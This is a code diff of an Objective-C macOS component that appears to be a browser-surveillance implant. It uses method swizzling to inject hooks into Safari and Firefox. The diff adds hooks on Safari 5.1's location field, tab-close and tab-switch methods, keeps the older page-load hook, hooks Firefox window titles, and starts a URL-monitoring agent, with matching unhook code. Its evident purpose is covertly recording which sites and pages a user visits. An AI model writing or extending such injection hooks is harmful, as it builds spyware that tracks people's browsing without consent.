@@ -1029,16 +1029,46 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           // Safari
           //
           usleep(2000000);
-          URLStartAgent();
-
-          Class className   = objc_getClass("BrowserWindowController");
+          // Safari up to 5.0
+          Class className   = objc_getClass("BrowserWindowControllerMac");
           Class classSource = objc_getClass("myBrowserWindowController");
-        
+
+          BOOL isSafariPrior51 = NO;
+
+          if (className == nil)
+            {
+              className = objc_getClass("BrowserWindowController");
+              if (className != nil)
+                isSafariPrior51 = YES;
+            }
+
           if (className != nil)
             {
-              swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
-                                  class_getMethodImplementation(classSource, @selector(webFrameLoadCommittedHook:)),
-                                  @selector(webFrameLoadCommittedHook:));
+              URLStartAgent();
+              if (isSafariPrior51)
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  warnLog(@"Safari < 5.1 (hook)");
+#endif
+                  swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
+                                      class_getMethodImplementation(classSource, @selector(webFrameLoadCommittedHook:)),
+                                      @selector(webFrameLoadCommittedHook:));
+                }
+              else
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  warnLog(@"Safari >= 5.1 (hook)");
+#endif
+                  swizzleByAddingIMP (className, @selector(_setLocationFieldText:),
+                                      class_getMethodImplementation(classSource, @selector(_setLocationFieldTextHook:)),
+                                      @selector(_setLocationFieldTextHook:));
+                  swizzleByAddingIMP (className, @selector(closeCurrentTab:),
+                                      class_getMethodImplementation(classSource, @selector(closeCurrentTabHook:)),
+                                      @selector(closeCurrentTabHook:));
+                  swizzleByAddingIMP (className, @selector(didSelectTabViewItem),
+                                      class_getMethodImplementation(classSource, @selector(didSelectTabViewItemHook)),
+                                      @selector(didSelectTabViewItemHook));
+                }
             }
           else
             {
@@ -1046,7 +1076,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
               warnLog(@"URL - not the right application, skipping");
 #endif
             }
-
           // End of Safari
 
           //
@@ -1074,9 +1103,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                             className, @selector(setTitleHook:));
               
             }
-
+          [firefoxAppName release];
           // End of Firefox 3
-
         }
       else if (urlFlag == 3)
         {
@@ -1085,15 +1113,38 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           infoLog(@"Unhooking URLs");
 #endif
           
-          Class className = objc_getClass("BrowserWindowController");
-          
+          Class className       = objc_getClass("BrowserWindowControllerMac");
+          BOOL isSafariPrior51  = NO;
+
+          if (className == nil)
+            {
+              className = objc_getClass("BrowserWindowController");
+              if (className != nil)
+                isSafariPrior51 = YES;
+            }
+
           if (className != nil)
             {
-              //swizzleByAddingIMP (className, @selector(webFrameLoadCommitted:),
-                                  //class_getMethodImplementation(className, @selector(webFrameLoadCommittedHook:)),
-                                  //@selector(webFrameLoadCommittedHook:));
-              swizzleMethod(className, @selector(webFrameLoadCommitted:),
+              if (isSafariPrior51)
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  warnLog(@"Safari < 5.1 (unhook)");
+#endif
+                  swizzleMethod(className, @selector(webFrameLoadCommitted:),
                             className, @selector(webFrameLoadCommittedHook:));
+                }
+              else
+                {
+#ifdef DEBUG_INPUT_MANAGER
+                  warnLog(@"Safari >= 5.1 (unhook)");
+#endif
+                  swizzleMethod(className, @selector(_setLocationFieldText:),
+                            className, @selector(_setLocationFieldTextHook:));
+                  swizzleMethod(className, @selector(closeCurrentTab:),
+                            className, @selector(closeCurrentTabHook:));
+                  swizzleMethod(className, @selector(didSelectTabViewItem),
+                            className, @selector(didSelectTabViewItemHook));
+                }
             }
           else
             {
@@ -1103,7 +1154,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             }
         
           // firefox 3
-
           NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
           NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
           
@@ -1118,18 +1168,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
 #endif      
-          if(firefox_res == NSOrderedSame)
+          if (firefox_res == NSOrderedSame)
             {
 #ifdef DEBUG_INPUT_MANAGER
               infoLog(@"Hooking fairfocs baby!");
 #endif
               
               Class className = objc_getClass("NSWindow");
-              
               swizzleMethod(className, @selector(setTitle:),
                             className, @selector(setTitleHook:));
-              
             }
+
+          [firefox_app release];
         }
       
       if (appFlag == 1)
@@ -1561,12 +1611,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       usleep(8000);
       [innerPool release];
     }
-
-  //[mSharedMemoryCommand detachFromMemoryRegion];
-  //[mSharedMemoryCommand release];
-  
-  //[mSharedMemoryLogging detachFromMemoryRegion];
-  //[mSharedMemoryLogging release];
 
   [pool release];
 }
